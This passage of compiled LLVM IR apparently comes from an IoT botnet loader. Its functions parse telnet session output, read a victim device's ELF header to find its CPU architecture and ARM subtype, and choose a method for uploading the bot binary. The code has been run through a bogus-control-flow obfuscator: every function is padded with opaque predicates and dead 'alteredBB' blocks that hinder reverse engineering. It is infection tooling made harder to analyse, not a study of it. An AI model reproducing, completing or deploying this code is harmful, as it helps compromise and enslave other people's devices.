  %425 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %424, i32 0, i32 2
  %426 = getelementptr inbounds [6 x i8], [6 x i8]* %425, i32 0, i32 0
  %427 = call i8* @strcpy(i8* %426, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #5
  br label %434

; <label>:428:                                    ; preds = %416
  %429 = load %struct.connection*, %struct.connection** %3, align 8
  %430 = getelementptr inbounds %struct.connection, %struct.connection* %429, i32 0, i32 3
  %431 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %430, i32 0, i32 2
  %432 = getelementptr inbounds [6 x i8], [6 x i8]* %431, i64 0, i64 0
  store i8 0, i8* %432, align 8
  %433 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %433)
  br label %434

; <label>:434:                                    ; preds = %428, %422
  br label %435

; <label>:435:                                    ; preds = %434, %originalBBpart254
  %436 = load i32, i32* @x.23
  %437 = load i32, i32* @y.24
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %435
  %444 = load i32, i32* @x.23
  %445 = load i32, i32* @y.24
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %452

; <label>:452:                                    ; preds = %originalBBpart258, %360
  %453 = load i32, i32* @x.23
  %454 = load i32, i32* @y.24
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %452
  %461 = load i32, i32* @x.23
  %462 = load i32, i32* @y.24
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %469

; <label>:469:                                    ; preds = %originalBBpart262, %originalBBpart238
  %470 = load i32, i32* @x.23
  %471 = load i32, i32* @y.24
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %469
  %478 = load i32, i32* @x.23
  %479 = load i32, i32* @y.24
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %486

; <label>:486:                                    ; preds = %originalBBpart266, %originalBBpart230
  br label %487

; <label>:487:                                    ; preds = %486, %181
  br label %488

; <label>:488:                                    ; preds = %487, %128
  %489 = load i32, i32* @x.23
  %490 = load i32, i32* @y.24
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %488
  %497 = load i32, i32* @x.23
  %498 = load i32, i32* @y.24
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %560

; <label>:505:                                    ; preds = %1
  %506 = load %struct.connection*, %struct.connection** %3, align 8
  %507 = getelementptr inbounds %struct.connection, %struct.connection* %506, i32 0, i32 15
  %508 = getelementptr inbounds [8192 x i8], [8192 x i8]* %507, i32 0, i32 0
  %509 = load %struct.connection*, %struct.connection** %3, align 8
  %510 = getelementptr inbounds %struct.connection, %struct.connection* %509, i32 0, i32 9
  %511 = load i16, i16* %510, align 8
  %512 = zext i16 %511 to i32
  %513 = call i32 @util_memsearch(i8* %508, i32 %512, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %513, i32* %6, align 4
  %514 = icmp ne i32 %513, -1
  br i1 %514, label %515, label %517

; <label>:515:                                    ; preds = %505
  %516 = load i32, i32* %6, align 4
  store i32 %516, i32* %2, align 4
  br label %561

; <label>:517:                                    ; preds = %505
  %518 = load %struct.connection*, %struct.connection** %3, align 8
  %519 = getelementptr inbounds %struct.connection, %struct.connection* %518, i32 0, i32 9
  %520 = load i16, i16* %519, align 8
  %521 = zext i16 %520 to i32
  %522 = icmp sgt i32 %521, 7168
  br i1 %522, label %523, label %559

; <label>:523:                                    ; preds = %517
  %524 = load i32, i32* @x.23
  %525 = load i32, i32* @y.24
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %523
  %532 = load %struct.connection*, %struct.connection** %3, align 8
  %533 = getelementptr inbounds %struct.connection, %struct.connection* %532, i32 0, i32 15
  %534 = getelementptr inbounds [8192 x i8], [8192 x i8]* %533, i32 0, i32 0
  %535 = load %struct.connection*, %struct.connection** %3, align 8
  %536 = getelementptr inbounds %struct.connection, %struct.connection* %535, i32 0, i32 15
  %537 = getelementptr inbounds [8192 x i8], [8192 x i8]* %536, i32 0, i32 0
  %538 = getelementptr inbounds i8, i8* %537, i64 6144
  %539 = load %struct.connection*, %struct.connection** %3, align 8
  %540 = getelementptr inbounds %struct.connection, %struct.connection* %539, i32 0, i32 9
  %541 = load i16, i16* %540, align 8
  %542 = zext i16 %541 to i32
  %543 = sub nsw i32 %542, 6144
  %544 = sext i32 %543 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %534, i8* %538, i64 %544, i32 1, i1 false)
  %545 = load %struct.connection*, %struct.connection** %3, align 8
  %546 = getelementptr inbounds %struct.connection, %struct.connection* %545, i32 0, i32 9
  %547 = load i16, i16* %546, align 8
  %548 = zext i16 %547 to i32
  %549 = sub nsw i32 %548, 6144
  %550 = trunc i32 %549 to i16
  store i16 %550, i16* %546, align 8
  %551 = load i32, i32* @x.23
  %552 = load i32, i32* @y.24
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart297, label %originalBB72alteredBB

originalBBpart297:                                ; preds = %originalBB72
  br label %559

; <label>:559:                                    ; preds = %originalBBpart297, %517
  br label %560

; <label>:560:                                    ; preds = %559, %originalBBpart270
  store i32 0, i32* %2, align 4
  br label %561

; <label>:561:                                    ; preds = %560, %515, %originalBBpart26, %22
  %562 = load i32, i32* %2, align 4
  ret i32 %562

originalBBalteredBB:                              ; preds = %originalBB, %23
  %563 = load i32, i32* %5, align 4
  %_ = sub i32 0, %563
  %gen = add i32 %_, 4
  %_1 = sub i32 %563, 4
  %gen2 = mul i32 %_1, 4
  %_3 = shl i32 %563, 4
  %564 = sub nsw i32 %563, 4
  store i32 %564, i32* %5, align 4
  %565 = load %struct.connection*, %struct.connection** %3, align 8
  %566 = getelementptr inbounds %struct.connection, %struct.connection* %565, i32 0, i32 15
  %567 = getelementptr inbounds [8192 x i8], [8192 x i8]* %566, i32 0, i32 0
  %568 = load i32, i32* %5, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds i8, i8* %567, i64 %569
  %571 = bitcast i8* %570 to %struct.elf_hdr*
  store %struct.elf_hdr* %571, %struct.elf_hdr** %4, align 8
  %572 = load %struct.connection*, %struct.connection** %3, align 8
  %573 = getelementptr inbounds %struct.connection, %struct.connection* %572, i32 0, i32 3
  %574 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %573, i32 0, i32 8
  store i8 1, i8* %574, align 1
  %575 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %576 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %575, i32 0, i32 0
  %577 = getelementptr inbounds [16 x i8], [16 x i8]* %576, i64 0, i64 5
  %578 = load i8, i8* %577, align 1
  %579 = zext i8 %578 to i32
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %57
  store i32 0, i32* %2, align 4
  br label %originalBB4

originalBB8alteredBB:                             ; preds = %originalBB8, %74
  %580 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %581 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %580, i32 0, i32 2
  %582 = load i16, i16* %581, align 1
  %583 = zext i16 %582 to i32
  %584 = call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %583)
  %585 = trunc i32 %584 to i16
  %586 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %587 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %586, i32 0, i32 2
  store i16 %585, i16* %587, align 1
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %100
  %588 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %589 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %588, i32 0, i32 2
  %590 = load i16, i16* %589, align 1
  %591 = zext i16 %590 to i32
  %592 = icmp eq i32 %591, 40
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %140
  %593 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %594 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %593, i32 0, i32 2
  %595 = load i16, i16* %594, align 1
  %596 = zext i16 %595 to i32
  %597 = icmp eq i32 %596, 10
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %188
  %598 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %599 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %598, i32 0, i32 2
  %600 = load i16, i16* %599, align 1
  %601 = zext i16 %600 to i32
  %602 = icmp eq i32 %601, 6
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %210
  %603 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %604 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %603, i32 0, i32 2
  %605 = load i16, i16* %604, align 1
  %606 = zext i16 %605 to i32
  %607 = icmp eq i32 %606, 7
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %238
  %608 = load %struct.connection*, %struct.connection** %3, align 8
  %609 = getelementptr inbounds %struct.connection, %struct.connection* %608, i32 0, i32 3
  %610 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %609, i32 0, i32 2
  %611 = getelementptr inbounds [6 x i8], [6 x i8]* %610, i32 0, i32 0
  %612 = call i8* @strcpy(i8* %611, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0)) #5
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %266
  %613 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %614 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %613, i32 0, i32 2
  %615 = load i16, i16* %614, align 1
  %616 = zext i16 %615 to i32
  %617 = icmp eq i32 %616, 18
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %294
  %618 = load %struct.connection*, %struct.connection** %3, align 8
  %619 = getelementptr inbounds %struct.connection, %struct.connection* %618, i32 0, i32 3
  %620 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %619, i32 0, i32 2
  %621 = getelementptr inbounds [6 x i8], [6 x i8]* %620, i32 0, i32 0
  %622 = call i8* @strcpy(i8* %621, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.26, i32 0, i32 0)) #5
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %316
  %623 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %624 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %623, i32 0, i32 2
  %625 = load i16, i16* %624, align 1
  %626 = zext i16 %625 to i32
  %627 = icmp eq i32 %626, 4
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %338
  %628 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %629 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %628, i32 0, i32 2
  %630 = load i16, i16* %629, align 1
  %631 = zext i16 %630 to i32
  %632 = icmp eq i32 %631, 5
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %372
  %633 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %634 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %633, i32 0, i32 2
  %635 = load i16, i16* %634, align 1
  %636 = zext i16 %635 to i32
  %637 = icmp eq i32 %636, 21
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %394
  %638 = load %struct.connection*, %struct.connection** %3, align 8
  %639 = getelementptr inbounds %struct.connection, %struct.connection* %638, i32 0, i32 3
  %640 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %639, i32 0, i32 2
  %641 = getelementptr inbounds [6 x i8], [6 x i8]* %640, i32 0, i32 0
  %642 = call i8* @strcpy(i8* %641, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i32 0, i32 0)) #5
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %435
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %452
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %469
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %488
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %523
  %643 = load %struct.connection*, %struct.connection** %3, align 8
  %644 = getelementptr inbounds %struct.connection, %struct.connection* %643, i32 0, i32 15
  %645 = getelementptr inbounds [8192 x i8], [8192 x i8]* %644, i32 0, i32 0
  %646 = load %struct.connection*, %struct.connection** %3, align 8
  %647 = getelementptr inbounds %struct.connection, %struct.connection* %646, i32 0, i32 15
  %648 = getelementptr inbounds [8192 x i8], [8192 x i8]* %647, i32 0, i32 0
  %649 = getelementptr inbounds i8, i8* %648, i64 6144
  %650 = load %struct.connection*, %struct.connection** %3, align 8
  %651 = getelementptr inbounds %struct.connection, %struct.connection* %650, i32 0, i32 9
  %652 = load i16, i16* %651, align 8
  %653 = zext i16 %652 to i32
  %_73 = sub i32 0, %653
  %gen74 = add i32 %_73, 6144
  %_75 = shl i32 %653, 6144
  %_76 = sub i32 %653, 6144
  %gen77 = mul i32 %_76, 6144
  %_78 = shl i32 %653, 6144
  %_79 = sub i32 %653, 6144
  %gen80 = mul i32 %_79, 6144
  %654 = sub nsw i32 %653, 6144
  %655 = sext i32 %654 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %645, i8* %649, i64 %655, i32 1, i1 false)
  %656 = load %struct.connection*, %struct.connection** %3, align 8
  %657 = getelementptr inbounds %struct.connection, %struct.connection* %656, i32 0, i32 9
  %658 = load i16, i16* %657, align 8
  %659 = zext i16 %658 to i32
  %_81 = sub i32 0, %659
  %gen82 = add i32 %_81, 6144
  %_83 = sub i32 0, %659
  %gen84 = add i32 %_83, 6144
  %_85 = sub i32 %659, 6144
  %gen86 = mul i32 %_85, 6144
  %_87 = sub i32 0, %659
  %gen88 = add i32 %_87, 6144
  %_89 = sub i32 %659, 6144
  %gen90 = mul i32 %_89, 6144
  %_91 = sub i32 %659, 6144
  %gen92 = mul i32 %_91, 6144
  %_93 = sub i32 0, %659
  %gen94 = add i32 %_93, 6144
  %_95 = shl i32 %659, 6144
  %660 = sub nsw i32 %659, 6144
  %661 = trunc i32 %660 to i16
  store i16 %661, i16* %657, align 8
  br label %originalBB72
}

declare i32 @htons(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arm_subtype(%struct.connection*) #0 {
  %2 = load i32, i32* @x.25
  %3 = load i32, i32* @y.26
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.connection*, align 8
  %12 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %11, align 8
  %13 = load %struct.connection*, %struct.connection** %11, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 15
  %15 = getelementptr inbounds [8192 x i8], [8192 x i8]* %14, i32 0, i32 0
  %16 = load %struct.connection*, %struct.connection** %11, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 9
  %18 = load i16, i16* %17, align 8
  %19 = zext i16 %18 to i32
  %20 = call i32 @util_memsearch(i8* %15, i32 %19, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %20, i32* %12, align 4
  %21 = load i32, i32* %12, align 4
  %22 = icmp eq i32 %21, -1
  %23 = load i32, i32* @x.25
  %24 = load i32, i32* @y.26
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %10, align 4
  br label %118

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.25
  %34 = load i32, i32* @y.26
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load %struct.connection*, %struct.connection** %11, align 8
  %42 = getelementptr inbounds %struct.connection, %struct.connection* %41, i32 0, i32 15
  %43 = getelementptr inbounds [8192 x i8], [8192 x i8]* %42, i32 0, i32 0
  %44 = load i32, i32* %12, align 4
  %45 = call i32 @util_memsearch(i8* %43, i32 %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i32 5)
  %46 = icmp ne i32 %45, -1
  %47 = load i32, i32* @x.25
  %48 = load i32, i32* @y.26
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %46, label %78, label %55

; <label>:55:                                     ; preds = %originalBBpart24
  %56 = load i32, i32* @x.25
  %57 = load i32, i32* @y.26
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load %struct.connection*, %struct.connection** %11, align 8
  %65 = getelementptr inbounds %struct.connection, %struct.connection* %64, i32 0, i32 15
  %66 = getelementptr inbounds [8192 x i8], [8192 x i8]* %65, i32 0, i32 0
  %67 = load i32, i32* %12, align 4
  %68 = call i32 @util_memsearch(i8* %66, i32 %67, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i32 5)
  %69 = icmp ne i32 %68, -1
  %70 = load i32, i32* @x.25
  %71 = load i32, i32* @y.26
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %69, label %78, label %100

; <label>:78:                                     ; preds = %originalBBpart28, %originalBBpart24
  %79 = load i32, i32* @x.25
  %80 = load i32, i32* @y.26
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %78
  %87 = load %struct.connection*, %struct.connection** %11, align 8
  %88 = getelementptr inbounds %struct.connection, %struct.connection* %87, i32 0, i32 3
  %89 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %88, i32 0, i32 2
  %90 = getelementptr inbounds [6 x i8], [6 x i8]* %89, i32 0, i32 0
  %91 = call i8* @strcpy(i8* %90, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #5
  %92 = load i32, i32* @x.25
  %93 = load i32, i32* @y.26
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %100

; <label>:100:                                    ; preds = %originalBBpart212, %originalBBpart28
  %101 = load i32, i32* @x.25
  %102 = load i32, i32* @y.26
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %100
  %109 = load i32, i32* %12, align 4
  store i32 %109, i32* %10, align 4
  %110 = load i32, i32* @x.25
  %111 = load i32, i32* @y.26
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %118

; <label>:118:                                    ; preds = %originalBBpart216, %31
  %119 = load i32, i32* @x.25
  %120 = load i32, i32* @y.26
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %118
  %127 = load i32, i32* %10, align 4
  %128 = load i32, i32* @x.25
  %129 = load i32, i32* @y.26
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret i32 %127

originalBBalteredBB:                              ; preds = %originalBB, %1
  %136 = alloca i32, align 4
  %137 = alloca %struct.connection*, align 8
  %138 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %137, align 8
  %139 = load %struct.connection*, %struct.connection** %137, align 8
  %140 = getelementptr inbounds %struct.connection, %struct.connection* %139, i32 0, i32 15
  %141 = getelementptr inbounds [8192 x i8], [8192 x i8]* %140, i32 0, i32 0
  %142 = load %struct.connection*, %struct.connection** %137, align 8
  %143 = getelementptr inbounds %struct.connection, %struct.connection* %142, i32 0, i32 9
  %144 = load i16, i16* %143, align 8
  %145 = zext i16 %144 to i32
  %146 = call i32 @util_memsearch(i8* %141, i32 %145, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %146, i32* %138, align 4
  %147 = load i32, i32* %138, align 4
  %148 = icmp eq i32 %147, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %149 = load %struct.connection*, %struct.connection** %11, align 8
  %150 = getelementptr inbounds %struct.connection, %struct.connection* %149, i32 0, i32 15
  %151 = getelementptr inbounds [8192 x i8], [8192 x i8]* %150, i32 0, i32 0
  %152 = load i32, i32* %12, align 4
  %153 = call i32 @util_memsearch(i8* %151, i32 %152, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i32 5)
  %154 = icmp ne i32 %153, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %155 = load %struct.connection*, %struct.connection** %11, align 8
  %156 = getelementptr inbounds %struct.connection, %struct.connection* %155, i32 0, i32 15
  %157 = getelementptr inbounds [8192 x i8], [8192 x i8]* %156, i32 0, i32 0
  %158 = load i32, i32* %12, align 4
  %159 = call i32 @util_memsearch(i8* %157, i32 %158, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i32 5)
  %160 = icmp ne i32 %159, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %78
  %161 = load %struct.connection*, %struct.connection** %11, align 8
  %162 = getelementptr inbounds %struct.connection, %struct.connection* %161, i32 0, i32 3
  %163 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %162, i32 0, i32 2
  %164 = getelementptr inbounds [6 x i8], [6 x i8]* %163, i32 0, i32 0
  %165 = call i8* @strcpy(i8* %164, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #5
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %100
  %166 = load i32, i32* %12, align 4
  store i32 %166, i32* %10, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %118
  %167 = load i32, i32* %10, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_upload_methods(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %1
  %16 = load i32, i32* @x.27
  %17 = load i32, i32* @y.28
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %2, align 4
  %24 = load i32, i32* @x.27
  %25 = load i32, i32* @y.28
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %77

; <label>:32:                                     ; preds = %1
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i32 0, i32 0
  %36 = load i32, i32* %4, align 4
  %37 = call i32 @util_memsearch(i8* %35, i32 %36, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.33, i32 0, i32 0), i32 22)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %43

; <label>:39:                                     ; preds = %32
  %40 = load %struct.connection*, %struct.connection** %3, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 3
  %42 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %41, i32 0, i32 6
  store i32 1, i32* %42, align 8
  br label %75

; <label>:43:                                     ; preds = %32
